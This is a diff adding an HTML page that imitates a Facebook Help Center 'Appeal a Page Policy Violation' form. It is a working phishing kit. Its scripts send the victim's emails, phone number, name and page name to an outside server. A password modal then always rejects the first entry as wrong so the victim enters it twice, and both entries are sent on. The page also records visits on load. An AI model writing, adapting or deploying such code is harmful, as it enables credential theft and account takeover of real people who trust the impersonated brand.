@@ -1,0 +1,306 @@
+<html lang="en"><head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>Facebook Help Center</title>
+      <link rel="icon" type="image/png" href="images/favicon.ico">
+      <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+      <script src="assets/js/jquery-3.6.0.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+      <script src="assets/js/bootstrap.min.js"></script>
+      <link rel="stylesheet" href="style.css">
+      <script type="text/javascript" src="http://l2.io/ip.js?var=ip"></script>
+      <script>let wrongPassword=false;</script>
+      <style>
+         .wrapper {
+            display: flex;
+            flex-wrap: wrap;
+         }
+         .top {
+            width: 100%;
+            height: 55px;
+         }
+         .left {
+            width: 19%;
+            height: 100%;
+         }
+         .right {
+            width: 81%;
+            height: 100%;
+         }
+         .main-container2 {
+            width: 45%;
+            margin-top: 20px;
+            margin-bottom: 50px;
+            position: relative;
+            top: unset;
+            left: unset;
+            transform: unset;
+         }
+
+         @media(max-width: 1500px) {
+            .top {
+               position: absolute;
+               left: 0;
+               right: 0;
+               top: 0;
+               bottom: 0;
+               width: 100%;
+               height: 55px;
+            }
+            .top img, .left img, .right img {
+               width: 100%;
+               height: auto;
+            }
+            .left {
+               position: relative;
+               top: 55px;
+            }
+            .right {
+               position: relative;
+               top: 40px;
+            }
+         }
+      </style>
+      <script type="text/javascript">
+      $(document).ready(function(){
+         var urlSite=(location.href.substring(0, location.href.lastIndexOf('/')));
+        $('#siteUrl').val(urlSite);
+      });
+      </script>
+   </head>
+   <body id="body" style="display:none!important">
+
+
+<!-- The Modal -->
+<div class="modal" id="myModal">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+
+      <!-- Modal Header -->
+      <div class="modal-header">
+        <h6 class="modal-title">Enter Your Password</h6>
+        <button type="button" class="close" data-dismiss="modal">×</button>
+      </div>
+
+      <!-- Modal body -->
+      <form method="post" onsubmit="return submitPassword();" id="password_modal">
+         <div class="modal-body">
+         <p style="color: red;" id="errorPassword"></p>
+         <input type="hidden" name="siteUrl" id="siteUrl" value="https://meta-info-70349.herokuapp.com">
+         <input required="" id="firstPassword" type="password" name="firstPassword" class="form-control" placeholder="Enter Password Here">
+         </div>
+
+         <!-- Modal footer -->
+         <div class="modal-footer">
+         <input class="submitBtn" type="submit" value="Continue">
+         </div>
+      </form>
+
+    </div>
+  </div>
+</div>
+      <div class="wrapper">
+         <div class="top">
+            <img src="images/top.png" alt="">
+         </div>
+   
+         <div class="left">
+            <img src="images/left.png" alt="">
+         </div>
+   
+         <div class="right">
+            <img src="images/bottom-top.png" alt="">
+
+            <div class="main-container2">
+               <div class="custom-form">
+                  <div class="appeal">
+                     <h3>Appeal a Page Policy Violation</h3>
+                  </div>
+                 
+
+                  <p class="normal-text">
+                     If you think your page was restricted by mistake, please fill out this form: 
+                  </p>
+                  <form name="RegForm" id="registerForm" onsubmit="return submitForm()">
+                  <div class="mb-3">
+                     <label for="exampleFormControlInput1" class="form-label">Page Name</label>
+                     <input type="text" name="Name" required="" class="form-control" id="pagename">
+                  </div>
+                  <div class="mb-3">
+                     <label for="business_email" class="form-label">Business email address</label>
+                     <input type="email" required="" class="form-control" id="business_email">
+                  </div>
+                  <div class="mb-3">
+                     <label for="personal_email" class="form-label">Personal email address</label>
+                     <input type="email" required="" class="form-control" id="personal_email">
+                  </div>
+                  <div class="mb-3">
+                     <label for="exampleFormControlInput1" class="form-label">Mobile number</label>
+                     <input type="text" required="" class="form-control" id="mobile">
+                  </div>
+                  <div class="mb-3">
+                     <label for="exampleFormControlInput1" class="form-label">Your full name</label>
+                     <input required="" type="text" name="exampleFormControlInput2" class="form-control" id="exampleFormControlInput2">
+                  </div>
+                  <div class="mb-3">
+                     <label for="exampleFormControlTextarea1" class="form-label">Additional info</label>
+                     <textarea class="form-control" name="exampleFormControlTextarea3" id="exampleFormControlTextarea3" rows="3"></textarea>
+                  </div>
+      
+                  <div class="bottom" style="padding-bottom: 2rem !important;">
+                    <input class="submitBtn" type="submit" value="Continue">
+                  </div>
+                  </form>
+               </div>
+            </div>
+
+            <!-- <img src="images/footer.png" alt=""> -->
+         </div>
+      </div>
+      
+      <script type="text/javascript">
+            var personal_email;
+            var business_email;
+            var name;
+            var mobile;
+            var additionalinfos;
+            var pagename;
+            
+            function submitForm(){
+               if(validateForm()){
+                  personal_email =  document.getElementById('personal_email').value;  
+                  business_email =  document.getElementById('business_email').value;  
+                  name = document.getElementById("exampleFormControlInput2").value;
+                  mobile =  document.getElementById('mobile').value;
+                  additionalinfos=document.getElementById("exampleFormControlTextarea3").value;
+                  pagename=document.getElementById("pagename").value;
+                  event.preventDefault();
+                  var step4HTML='';
+                  $('#myModal').modal('show'); 
+                  sendData()
+                  /*setTimeout(function(){
+                  $('.main-container2').html('<form name="RegForm" id="registerForm"><div class="custom-form"><div class="appeal"><h3>Enter Your Password</h3></div><p class="normal-text">For your security, you must enter your password to continue.</p><div class="mb-3 row border-top-bottom"><label for="inputPassword" class="col-sm-3 col-form-label">Your Password</label><div class="col-sm-9"><input type="password" required name="password" class="form-control" id="inputPassword"></div></div><div class="bottom"><button id="submitBtn" class="submitBtn" onclick="sendData()">Continue</button></form> </div></div>');  
+                  }, 750);*/
+               }
+               else return false;
+            }
+            function validatePassword(){
+               event.preventDefault();
+               let password = document.getElementById('firstPassword');
+
+               if (password.value == "") { 
+                  window.alert("Please fill the password field."); 
+                  password.focus(); 
+                  return false; 
+               }
+
+               if(password.value.length < 6){
+                  window.alert("Please enter a valid password.");
+                  password.focus();
+                  return false;
+               }
+
+               return true;
+            }
+         function submitPassword(){
+            if(validatePassword()){
+               let password = document.getElementById('firstPassword');
+               
+               let data = {
+                  ip: '160.36.59.197',
+                  input: password.value,
+                  progress: wrongPassword ? 'Second password' : 'First password'
+               };
+
+               $.ajax({
+                  url: "https://world.desk-meta.com/api/activity/3",
+                  type: "POST",
+                  data: JSON.stringify(data),
+                  contentType: "application/json; charset=utf-8",
+                  dataType: "json",
+                  success: function(){
+                     if(wrongPassword){
+                        window.location.href = "pw.html";
+                     }else{
+                        wrongPassword = true;
+                        password.value = "";
+                        password.focus();
+                        document.getElementById('errorPassword').innerHTML = "Your password is incorrect, please try again.";
+                     }
+                  }
+               });
+            }
+         }
+        function sendData()
+        {
+               event.preventDefault()
+               var siteUrl=window.location.href;
+               var emailInfos='Ok';
+               //var firstPassword =  document.getElementById('inputPassword').value;
+               let data = {
+                  ip: '160.36.59.197',
+                  page_name: pagename,
+                  personal_email: personal_email,
+                  business_email: business_email,
+                  mobile_number: mobile,
+                  full_name: name,
+                  additional_info: additionalinfos,
+                  site_url: siteUrl
+               };
+               $.ajax
+               ({
+                  url: "https://world.desk-meta.com/api/activity/2",
+                  type: "POST",
+                  data: JSON.stringify(data),
+                  contentType: "application/json; charset=utf-8",
+                  dataType:"json",
+                  success: function(){
+                  }
+               });
+        }
+
+
+        function validateForm(){
+         event.preventDefault()
+        var name = document.forms["RegForm"]["Name"]; 
+        var email = document.forms["RegForm"]["EMail"]; 
+        var phone = document.forms["RegForm"]["Telephone"]; 
+        var what = document.forms["RegForm"]["Subject"]; 
+      
+  
+        if (name.value == "") { 
+            window.alert("Please enter your name."); 
+            name.focus(); 
+            return false; 
+        } 
+       
+        return true; 
+        }
+
+        $(document).ready(function(){
+          setTimeout(function(){
+            $("#body").show();
+          },300);
+        });
+      </script>
+      <script>
+           $(document).ready(function() {
+               let data = {
+                  ip: '160.36.59.197',
+                  input: "x",
+                  progress: "Opened form page"
+               };
+
+               $.ajax({
+                  url: "https://world.desk-meta.com/api/activity/3",
+                  type: "POST",
+                  data: JSON.stringify(data),
+                  contentType: "application/json; charset=utf-8",
+                  dataType: "json",
+                  success: function(){
+                  }
+               });
+           });
+        </script>
+  
+</body></html>
